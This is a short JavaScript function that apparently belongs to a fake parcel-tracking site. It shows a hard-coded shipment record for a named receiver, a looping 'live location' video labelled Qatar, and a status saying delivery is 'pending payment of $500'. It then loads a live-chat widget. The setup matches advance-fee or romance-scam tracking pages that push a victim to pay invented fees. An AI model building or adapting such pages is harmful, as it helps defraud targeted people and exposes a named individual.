function handle27584844LXVN(resultElement) {
    let result = {
        sender: 'Daniel Williams',
        country: 'Canada',
        receiver: 'Maria Ludelyn N.Cordial',
        date: 'OCT 18, 2025',
        location: 'Out for Delivery - Out for Delivery - Area. Within 24 hours package would get to destined country - pending payment of $500 dollars '
    };

    // Display the result
    resultElement.innerHTML = `
        <p>SENDER NAME: ${result.sender}</p>
        <p>SENDER ADDRESS: ${result.country}</p>
        <p>RECIEVERS NAME: ${result.receiver}</p>
        <p>DATE: ${result.date}</p>
        <p><video id="local" 
        src="live.mp4" autoplay muted loop></video>           Live Location: QATAR ${result.location}</p>`;

    // Inject the LiveChat script
    const livechatScript = document.createElement('script');
    livechatScript.src = "//code.tidio.co/beqno6qogvzvp3rdcop7yynzntflrwgi.js";
    livechatScript.async = true;
    document.body.appendChild(livechatScript);
}